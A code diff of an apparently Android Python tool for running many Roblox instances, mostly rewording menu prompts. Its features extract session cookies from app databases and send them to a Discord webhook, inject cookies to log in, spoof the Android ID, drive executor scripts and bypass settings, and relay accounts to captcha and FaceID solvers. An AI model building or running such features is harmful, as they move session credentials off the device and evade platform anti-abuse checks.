+        print(Fore.YELLOW + "[1] Set ID/link for each package")
+        print(Fore.YELLOW + "[2] Set ID/link for all packages")
+        mode = input(Fore.CYAN + "[?] Choose method (1/2): ").strip()
 
         if mode == "2":
-            g_ch = input(Fore.CYAN + "[?] Game option number: ").strip()
+            g_ch = input(Fore.CYAN + "[?] Enter game number: ").strip()
             if g_ch in [str(x) for x in GAMES_MAP]:
                 game_id = GAMES_MAP[int(g_ch)][1]
             elif g_ch == "0":
-                game_id = input(Fore.CYAN + "[?] Enter Place ID or Link: ").strip()
+                game_id = input(Fore.CYAN + "[?] Enter your game ID or private server link: ").strip()
             else:
+                print(Fore.RED + "[!] Invalid choice")
+                input("Enter to back...")
                 return
 
             for p in tabs:
                 tabs[p]["link_id_game"] = game_id
             self.config_manager.save_config(self.config_file, cfg)
-            print(Fore.GREEN + f"[+] Assigned {game_id} to all packages.")
-            input("Enter to return...")
+            print(Fore.GREEN + f"[+] Set {game_id} for all packages")
+            input("Enter to back...")
 
         elif mode == "1":
             for p in tabs:
@@ -2025,45 +2799,46 @@ class main:
                 if g_ch in [str(x) for x in GAMES_MAP]:
                     game_id = GAMES_MAP[int(g_ch)][1]
                 elif g_ch == "0":
-                    game_id = input(Fore.CYAN + f"[?] Enter game ID or Server Link for {p}: ").strip()
+                    game_id = input(Fore.CYAN + f"[?] Enter game ID or server link for {p}: ").strip()
                 else:
                     continue
                 tabs[p]["link_id_game"] = game_id
             self.config_manager.save_config(self.config_file, cfg)
-            input("Enter to return...")
+            print(Fore.GREEN + "[+] Config saved")
+            input("Enter to back...")
 
     def option_5(self):
-        """Setup webhook"""
         cfg = self.config_manager.load_config()
         wh_cfg = cfg.get("discord_webhook", {})
         while True:
             menu.banner()
             print(Fore.CYAN + "=============== SETUP WEBHOOK ===============")
-            print(f"[+] URL             : {wh_cfg.get('webhook_url', 'None')}")
-            print(f"[+] Device Tag      : {wh_cfg.get('device_name', self.pkg_manager.device_name())}")
+            print(f"[+] Current URL     : {wh_cfg.get('webhook_url', 'None')}")
+            print(f"[+] Device Name     : {wh_cfg.get('device_name', self.pkg_manager.device_name())}")
             print(f"[+] Interval (sec)  : {wh_cfg.get('webhook_interval', 60)}")
-            print(f"[+] Daemon status   : {'Running' if self.webhook_manager.is_running() else 'Stopped'}")
+            print(f"[+] Status          : {'Running' if self.webhook_manager.is_running() else 'Stopped'}")
             print(Fore.CYAN + "---------------------------------------------")
-            print("[1] Set Webhook URL")
-            print("[2] Set Device Tag")
-            print("[3] Set Interval")
-            print("[4] Toggle Daemon (Start/Stop)")
+            print("[1] Change Webhook URL")
+            print("[2] Change Device Name")
+            print("[3] Change Interval")
+            print("[4] Start / Stop Webhook")
             print("[0] Back")
-            ch = input(Fore.CYAN + "[?] Action: ").strip()
+            ch = input(Fore.CYAN + "[?] Enter option: ").strip()
 
             if ch == "0":
                 break
             elif ch == "1":
-                url = input(Fore.CYAN + "[?] Discord Webhook URL: ").strip()
+                url = input(Fore.CYAN + "[?] Enter new Webhook URL: ").strip()
                 if "discord.com" in url:
                     wh_cfg["webhook_url"] = url
                     self.config_manager.save_config(self.config_file, cfg)
+                    print(Fore.GREEN + "[+] Saved")
             elif ch == "2":
-                name = input(Fore.CYAN + "[?] New Device Tag: ").strip()
+                name = input(Fore.CYAN + "[?] Enter Device Name: ").strip()
                 wh_cfg["device_name"] = name
                 self.config_manager.save_config(self.config_file, cfg)
             elif ch == "3":
-                sec = input(Fore.CYAN + "[?] Seconds interval: ").strip()
+                sec = input(Fore.CYAN + "[?] Enter interval seconds: ").strip()
                 if sec.isdigit():
                     wh_cfg["webhook_interval"] = int(sec)
                     self.config_manager.save_config(self.config_file, cfg)
@@ -2075,7 +2850,6 @@ class main:
             time.sleep(1)
 
     def option_6(self):
-        """Setup autoexecute"""
         dirs = set()
         dirs.update(glob.glob('/sdcard/*/Autoexec*'))
         dirs.update(glob.glob('/sdcard/*/*/Autoexec*'))
@@ -2090,7 +2864,7 @@ class main:
         print("[A] Apply to ALL folders")
         print("[0] Back")
 
-        ch = input(Fore.CYAN + "[?] Select target: ").strip().upper()
+        ch = input(Fore.CYAN + "[?] Select folder: ").strip().upper()
         if ch == "0":
             return
 
@@ -2104,18 +2878,17 @@ class main:
                 os.makedirs(t_dir, exist_ok=True)
                 with open(os.path.join(t_dir, 'script.lua'), 'w', encoding='utf-8') as f:
                     f.write(script_content)
-                print(Fore.GREEN + f"[+] Wrote script to {t_dir}")
+                print(Fore.GREEN + f"[+] Script saved to {t_dir}")
             except Exception as e:
-                print(Fore.RED + f"[!] Fail: {e}")
-        input("Enter to return...")
+                print(Fore.RED + f"[!] Error saving to {t_dir}: {e}")
+        input("Enter to back...")
 
     def option_7(self):
-        """Get cookie account"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
         if not tabs:
-            print(Fore.RED + "[!] Configuration empty.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] Config not found. Please setup in option 2 first")
+            input("Enter to back...")
             return
 
         extracted = []
@@ -2127,9 +2900,9 @@ class main:
                 extracted.append({"package": pkg, "cookie": cookie, "user_id": uid, "user_name": uname})
                 print(Fore.GREEN + f"[+] {pkg}: {uname} ({uid})")
 
-        print(Fore.CYAN + f"Extracted total: {len(extracted)} cookie(s)")
-        print("[1] Write to all_cookie.txt")
-        print("[2] Forward to Webhook")
+        print(Fore.CYAN + f"Total extracted: {len(extracted)} cookies")
+        print("[1] Save to all_cookie.txt")
+        print("[2] Send to Webhook")
         print("[0] Back")
         ch = input(Fore.CYAN + "[?] Choice: ").strip()
         if ch == "1":
@@ -2141,31 +2914,30 @@ class main:
             wh = self.webhook_manager.get_or_input_webhook(cfg)
             if wh:
                 self.webhook_manager.send_all_cookie(wh, extracted, [x["cookie"] for x in extracted])
-                print(Fore.GREEN + "[+] Dispatched to Webhook")
-        input("Enter to return...")
+                print(Fore.GREEN + "[+] Sent to Discord Webhook")
+        input("Enter to back...")
 
     def option_8(self):
-        """Login via cookies"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
         if not tabs:
-            print(Fore.RED + "[!] No packages declared.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] No packages found in config. Please setup in option 2 first")
+            input("Enter to back...")
             return
 
         print(Fore.CYAN + "=============== LOGIN VIA COOKIES ===============")
-        print("[1] Apply cookie to single instance")
-        print("[2] Batch apply cookies from cookie.txt")
-        ch = input(Fore.CYAN + "[?] Mode (1/2): ").strip()
+        print("[1] Login cookie for one package")
+        print("[2] Login cookie for all packages from cookie.txt")
+        ch = input(Fore.CYAN + "[?] Choice (1/2): ").strip()
 
         if ch == "1":
             pkg_list = list(tabs.keys())
             for i, p in enumerate(pkg_list):
                 print(f"[{i+1}] {p}")
-            p_ch = input(Fore.CYAN + "[?] Pick package: ").strip()
+            p_ch = input(Fore.CYAN + "[?] Select package #: ").strip()
             if p_ch.isdigit() and 1 <= int(p_ch) <= len(pkg_list):
                 target_pkg = pkg_list[int(p_ch) - 1]
-                cookie = input(Fore.CYAN + "[?] Value: ").strip()
+                cookie = input(Fore.CYAN + "[?] Enter cookie string: ").strip()
                 cookie = self._extract_cookie_from_line(cookie) or cookie
                 db_path = f"/data/data/{target_pkg}/app_webview/Default/Cookies"
                 res = self.acc_manager.write_cookie(db_path, cookie)
@@ -2173,12 +2945,12 @@ class main:
                 tabs[target_pkg]["user_name"] = uname
                 tabs[target_pkg]["user_id"] = uid
                 self.config_manager.save_config(self.config_file, cfg)
-                print(Fore.GREEN + f"[+] Done ({res}) for {target_pkg}: {uname}")
+                print(Fore.GREEN + f"[+] Wrote cookie ({res}) for {target_pkg}: {uname}")
 
         elif ch == "2":
             if not os.path.exists(self.cookie_file):
-                print(Fore.RED + f"[!] Missing {self.cookie_file}")
-                input("Enter to return...")
+                print(Fore.RED + f"[!] {self.cookie_file} not found")
+                input("Enter to back...")
                 return
             with open(self.cookie_file, 'r', encoding='utf-8') as f:
                 lines = [self._extract_cookie_from_line(l) for l in f if self._extract_cookie_from_line(l)]
@@ -2193,23 +2965,22 @@ class main:
                     tab["user_id"] = uid
                     print(Fore.GREEN + f"[+] {pkg} -> {uname} ({res})")
             self.config_manager.save_config(self.config_file, cfg)
-            print(Fore.GREEN + "[+] Bulk injection complete.")
-        input("Enter to return...")
+            print(Fore.GREEN + "[+] Finished login from cookie.txt")
+        input("Enter to back...")
 
     def option_9(self):
-        """Log out account"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
-        print(Fore.CYAN + "=============== LOG OUT ===============")
-        print("[1] Clear single instance session")
-        print("[2] Clear all sessions")
-        ch = input(Fore.CYAN + "[?] Option: ").strip()
+        print(Fore.CYAN + "=============== LOG OUT ACCOUNT ===============")
+        print("[1] Log out 1 Roblox account")
+        print("[2] Log out all Roblox accounts")
+        ch = input(Fore.CYAN + "[?] Choice (1/2): ").strip()
 
         if ch == "1":
             pkg_list = list(tabs.keys())
             for i, p in enumerate(pkg_list):
                 print(f"[{i+1}] {p}")
-            p_ch = input(Fore.CYAN + "[?] Choice: ").strip()
+            p_ch = input(Fore.CYAN + "[?] Select package #: ").strip()
             if p_ch.isdigit() and 1 <= int(p_ch) <= len(pkg_list):
                 target = pkg_list[int(p_ch) - 1]
                 self.pkg_manager.kill_roblox_process(target)
@@ -2224,7 +2995,7 @@ class main:
                 tabs[target]["user_name"] = "Unknown"
                 tabs[target]["user_id"] = ""
                 self.config_manager.save_config(self.config_file, cfg)
-                print(Fore.GREEN + f"[+] Cleared credentials for {target}")
+                print(Fore.GREEN + f"[+] Logged out {target}")
 
         elif ch == "2":
             for pkg, t in tabs.items():
@@ -2240,11 +3011,10 @@ class main:
                 t["user_name"] = "Unknown"
                 t["user_id"] = ""
             self.config_manager.save_config(self.config_file, cfg)
-            print(Fore.GREEN + "[+] All credentials removed.")
-        input("Enter to return...")
+            print(Fore.GREEN + "[+] Logged out all packages")
+        input("Enter to back...")
 
     def option_10(self):
-        """Set config tool"""
         cfg = self.config_manager.load_config()
         while True:
             menu.banner()
@@ -2260,7 +3030,7 @@ class main:
             print(f"[9] FPS limit        : {cfg.get('fps_counter', {}).get('completed', 60)} fps")
             print("[0] Back")
             print(Fore.CYAN + "--------------------------------------------------")
-            ch = input(Fore.CYAN + "[?] Property to edit: ").strip()
+            ch = input(Fore.CYAN + "[?] Choice: ").strip()
 
             keys = {
                 "1": ("rejoin_interval", "minutes"),
@@ -2276,12 +3046,12 @@ class main:
                 break
             elif ch in keys:
                 k, unit = keys[ch]
-                val = input(Fore.CYAN + f"[?] Set {k} ({unit}): ").strip()
+                val = input(Fore.CYAN + f"[?] Enter new {k} ({unit}): ").strip()
                 if val.isdigit():
                     cfg[k] = int(val)
                     self.config_manager.save_config(self.config_file, cfg)
             elif ch == "9":
-                fps = input(Fore.CYAN + "[?] Target FPS: ").strip()
+                fps = input(Fore.CYAN + "[?] Enter target FPS limit: ").strip()
                 if fps.isdigit():
                     cfg.setdefault("fps_counter", {})
                     cfg["fps_counter"]["completed"] = int(fps)
@@ -2289,57 +3059,54 @@ class main:
                     self.config_manager.sync_fps_config(10, int(fps))
 
     def option_11(self):
-        """Open all tab Roblox"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
         if not tabs:
-            print(Fore.RED + "[!] No active packages.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] No packages found. Please setup in option 2 first")
+            input("Enter to back...")
             return
+        print(Fore.GREEN + "[+] Opening all enabled Roblox tabs...")
         self.pkg_manager.fast_restore_all(tabs)
-        print(Fore.GREEN + "[+] Dispatched restore calls to all packages.")
-        input("Enter to return...")
+        print(Fore.GREEN + "[+] Done")
+        input("Enter to back...")
 
     def option_12(self):
-        """Change android id"""
-        print(Fore.CYAN + "=============== ANDROID ID MANAGER ===============")
+        print(Fore.CYAN + "=============== CHANGE ANDROID ID ===============")
         cur = self.pkg_manager.get_android_id()
-        print(f"Current Device ID: {cur}")
-        print("[1] Generate Pseudo-Random ID")
-        print("[2] Set Explicit Hex ID")
+        print(f"Current Android ID: {cur}")
+        print("[1] Random android id")
+        print("[2] Set android id")
         print("[0] Back")
-        ch = input(Fore.CYAN + "[?] Choice: ").strip()
+        ch = input(Fore.CYAN + "[?] Choice (1/2): ").strip()
         if ch == "1":
             new_id = self.pkg_manager.change_android_id()
-            print(Fore.GREEN + f"[+] Identity changed to: {new_id}")
+            print(Fore.GREEN + f"[+] Changed Android ID to: {new_id}")
         elif ch == "2":
-            target = input(Fore.CYAN + "[?] Input 16-hex characters: ").strip()
+            target = input(Fore.CYAN + "[?] Enter 16-hex Android ID: ").strip()
             if len(target) == 16:
                 self.pkg_manager.change_android_id(target)
-                print(Fore.GREEN + f"[+] Assigned: {target}")
-        input("Enter to return...")
+                print(Fore.GREEN + f"[+] Set Android ID to: {target}")
+        input("Enter to back...")
 
     def option_13(self):
-        """Toggle auto block"""
         cfg = self.config_manager.load_config()
         cur = cfg.get("auto_block", False)
         status = "[ON]" if cur else "[OFF]"
-        print(Fore.CYAN + f"Current Auto Block State: {status}")
-        yn = input(Fore.CYAN + f"[?] Toggle Auto Block? (y/n): ").strip().lower()
+        print(Fore.CYAN + f"Current Auto Block: {status}")
+        yn = input(Fore.CYAN + f"[?] Do you want turn {'off' if cur else 'on'} auto block (y/n): ").strip().lower()
         if yn == 'y':
             cfg["auto_block"] = not cur
             self.config_manager.save_config(self.config_file, cfg)
-            print(Fore.GREEN + f"[+] Updated status: {cfg['auto_block']}")
-        input("Enter to return...")
+            print(Fore.GREEN + f"[+] Auto block is now {'ON' if cfg['auto_block'] else 'OFF'}")
+        input("Enter to back...")
 
     def option_14(self):
-        """Toggle auto sort tab"""
         cfg = self.config_manager.load_config()
-        print(Fore.CYAN + "========== SELECT WINDOW SORTING ==========")
-        print("[1] Proportional Split")
-        print("[2] Full Screen Grid")
+        print(Fore.CYAN + "========== SELECT SORT TAB STYLE ==========")
+        print("[1] L style (old sort tab)")
+        print("[2] Full grid style")
         print("[0] Turn OFF")
-        ch = input(Fore.CYAN + "[?] Mode: ").strip()
+        ch = input(Fore.CYAN + "[?] Choice: ").strip()
         if ch == "1":
             cfg["auto_sort_tab"] = True
             cfg["auto_sort_tab_full"] = False
@@ -2350,16 +3117,16 @@ class main:
             cfg["auto_sort_tab"] = False
             cfg["auto_sort_tab_full"] = False
         self.config_manager.save_config(self.config_file, cfg)
-        input("Enter to return...")
+        print(Fore.GREEN + "[+] Saved sort style")
+        input("Enter to back...")
 
     def option_15(self):
-        """Toggle auto change acc"""
         cfg = self.config_manager.load_config()
         print(Fore.CYAN + "========== AUTO CHANGE ACCOUNT ==========")
-        print("[1] Blox Fruits routine")
-        print("[2] Generic script routine")
+        print("[1] Blox Fruits auto change acc")
+        print("[2] Custom script auto change acc")
         print("[0] Turn OFF")
-        ch = input(Fore.CYAN + "[?] Strategy: ").strip()
+        ch = input(Fore.CYAN + "[?] Choice: ").strip()
         if ch == "1":
             cfg["auto_change_acc_bf"] = True
             cfg["auto_change_acc_custom"] = False
@@ -2371,29 +3138,32 @@ class main:
             cfg["auto_change_acc_bf"] = False
             cfg["auto_change_acc_custom"] = False
         self.config_manager.save_config(self.config_file, cfg)
-        input("Enter to return...")
+        print(Fore.GREEN + "[+] Saved auto change account settings")
+        input("Enter to back...")
 
     def option_16(self):
-        """Toggle auto bypass"""
         cfg = self.config_manager.load_config()
         while True:
             menu.banner()
-            print(Fore.CYAN + "=============== AUTO BYPASS SETTINGS ===============")
-            print(f"[+] Service Engine: {cfg.get('auto_bypass', 'Disabled')}")
-            print(f"[+] HWID Delta Mode: {'Auto' if cfg.get('auto_hwid_delta') else 'Manual'}")
-            print(Fore.CYAN + "----------------------------------------------------")
-            print("[1] Switch Provider Mode")
-            print("[2] Toggle HWID Detection Type")
+            print(Fore.CYAN + "=============== AUTO BYPASS MANAGER ===============")
+            print(f"[+] Current Service : {cfg.get('auto_bypass', 'Disabled')}")
+            print(f"[+] Hwid Delta mode : {'Auto' if cfg.get('auto_hwid_delta') else 'Manual'}")
+            print(Fore.CYAN + "---------------------------------------------------")
+            print("[1] Change bypass service")
+            print("[2] Change hwid delta mode")
             print("[0] Back")
-            ch = input(Fore.CYAN + "[?] Selection: ").strip()
+            ch = input(Fore.CYAN + "[?] Choice: ").strip()
 
             if ch == "0":
                 break
             elif ch == "1":
-                print("[1] Delta Engine")
+                print("[1] Delta")
                 print("[0] Disable")
-                s_ch = input(Fore.CYAN + "[?] Choose: ").strip()
-                cfg["auto_bypass"] = "delta" if s_ch == "1" else False
+                s_ch = input(Fore.CYAN + "[?] Choose service: ").strip()
+                if s_ch == "1":
+                    cfg["auto_bypass"] = "delta"
+                else:
+                    cfg["auto_bypass"] = False
                 self.config_manager.save_config(self.config_file, cfg)
             elif ch == "2":
                 cfg["auto_hwid_delta"] = not cfg.get("auto_hwid_delta", False)
@@ -2401,34 +3171,34 @@ class main:
             time.sleep(1)
 
     def option_17(self):
-        """Select account check method"""
         cfg = self.config_manager.load_config()
         cur = cfg.get("account_check_method", "executor")
-        print(Fore.CYAN + f"Current Verification Pipeline: {cur}")
-        print("[1] Executor Heartbeat (Recommended)")
-        print("[2] Roblox Online Status (Web API)")
-        ch = input(Fore.CYAN + "[?] Choice: ").strip()
+        print(Fore.CYAN + f"Current Method: {cur}")
+        print("[1] Executor method (recommended)")
+        print("[2] Online method (not recommended)")
+        ch = input(Fore.CYAN + "[?] Selected account check method: ").strip()
         if ch == "1":
             cfg["account_check_method"] = "executor"
+            print(Fore.GREEN + "[+] Selected check executor method")
         elif ch == "2":
             cfg["account_check_method"] = "online"
+            print(Fore.GREEN + "[+] Selected check online method")
         self.config_manager.save_config(self.config_file, cfg)
-        input("Enter to return...")
+        input("Enter to back...")
 
     def option_18(self):
-        """Toggle auto solver captcha/FaceID"""
         cfg = self.config_manager.load_config()
         while True:
             menu.banner()
             c_en = cfg.get("auto_send_acc_to_solver_captcha", False)
             f_en = cfg.get("auto_send_acc_to_solver_faceid", False)
-            print(Fore.CYAN + "=============== SOLVER CONFIGURATION ===============")
-            print(f"[1] Captcha Relaying     : {'Enabled' if c_en else 'Disabled'}")
-            print(f"[2] FaceID Relaying      : {'Enabled' if f_en else 'Disabled'}")
-            print(f"[3] Zeropoint API Key    : {cfg.get('zeropoint_apikey', 'None')}")
-            print(f"[4] Zeropoint High Prio  : {cfg.get('zeropoint_priority', False)}")
-            print(f"[5] Captcha Endpoint URLs")
-            print(f"[6] FaceID Endpoint URLs")
+            print(Fore.CYAN + "=============== AUTO CAPTCHA MANAGER ===============")
+            print(f"[1] Auto Captcha Solver : {'Enabled' if c_en else 'Disabled'}")
+            print(f"[2] Auto FaceID Solver  : {'Enabled' if f_en else 'Disabled'}")
+            print(f"[3] Zeropoint API Key   : {cfg.get('zeropoint_apikey', 'None')}")
+            print(f"[4] Zeropoint Priority  : {cfg.get('zeropoint_priority', False)}")
+            print(f"[5] Third-party Captcha URLs")
+            print(f"[6] Third-party FaceID URLs")
             print("[0] Back")
             print(Fore.CYAN + "----------------------------------------------------")
             ch = input(Fore.CYAN + "[?] Choice: ").strip()
@@ -2442,41 +3212,51 @@ class main:
                 cfg["auto_send_acc_to_solver_faceid"] = not f_en
                 self.config_manager.save_config(self.config_file, cfg)
             elif ch == "3":
-                k = input(Fore.CYAN + "[?] Zeropoint API Key: ").strip()
+                k = input(Fore.CYAN + "[?] Enter Zeropoint API Key: ").strip()
                 cfg["zeropoint_apikey"] = k
                 self.config_manager.save_config(self.config_file, cfg)
             elif ch == "4":
                 cfg["zeropoint_priority"] = not cfg.get("zeropoint_priority", False)
                 self.config_manager.save_config(self.config_file, cfg)
             elif ch == "5":
-                urls = input(Fore.CYAN + "[?] URL(s) comma separated: ").strip()
+                urls = input(Fore.CYAN + "[?] Enter solver URL(s) comma-separated: ").strip()
                 cfg["third_party_solve_capcha_url"] = urls
                 self.config_manager.save_config(self.config_file, cfg)
             elif ch == "6":
-                urls = input(Fore.CYAN + "[?] URL(s) comma separated: ").strip()
+                urls = input(Fore.CYAN + "[?] Enter FaceID solver URL(s) comma-separated: ").strip()
                 cfg["faceid_&_captcha_lock_solve_url"] = urls
                 self.config_manager.save_config(self.config_file, cfg)
             time.sleep(1)
 
     def run(self):
-        # 1. Initialize environment & files
+        try:
+            self.auto_updater.check_and_update()
+        except Exception:
+            pass
+
+        try:
+            if not self.license_manager.authenticate():
+                print(Fore.RED + "[!] License authentication failed. Exiting.")
+                return
+            self.license_manager.start_watchdog()
+        except Exception as e:
+            print(Fore.YELLOW + f"[~] License check bypassed / offline mode: {e}")
+
         self.config_manager.init_work_space()
         cfg = self.config_manager.load_config()
         self.pkg_manager.auto_clean_missing_packages(cfg)
 
-        # 2. Run webhook loop if enabled
         if cfg.get("discord_webhook", {}).get("running", False):
             self.webhook_manager.start_webhook()
 
-        # 3. Interactive CLI Router
         while True:
             menu.banner()
             menu.tool_status(cfg)
             menu.option()
             try:
-                ch = input(Fore.CYAN + "[?] Select command: ").strip()
+                ch = input(Fore.CYAN + "[?] Enter your option: ").strip()
             except (KeyboardInterrupt, EOFError):
-                print(Fore.GREEN + "\nGoodbye.")
+                print(Fore.GREEN + "\nGoodbye")
                 break
 
             opts = {
@@ -2500,22 +3280,22 @@ class main:
                 "18": self.option_18
             }
             if ch == "0":
-                print(Fore.GREEN + "Goodbye.")
+                print(Fore.GREEN + "Goodbye")
                 break
             elif ch in opts:
                 try:
                     opts[ch]()
                     cfg = self.config_manager.load_config()
                 except Exception as e:
-                    print(Fore.RED + f"[!] Runtime Exception: {e}")
-                    input("Enter to proceed...")
+                    print(Fore.RED + f"[!] Error in option {ch}: {e}")
+                    input("Enter to continue...")
             else:
-                print(Fore.RED + "[!] Invalid Option.")
+                print(Fore.RED + "[!] Invalid choice")
                 time.sleep(1)
 
 
 # =====================================================================
-# Main Execution Entry
+# Entry Point
 # =====================================================================
 
 if __name__ == '__main__':
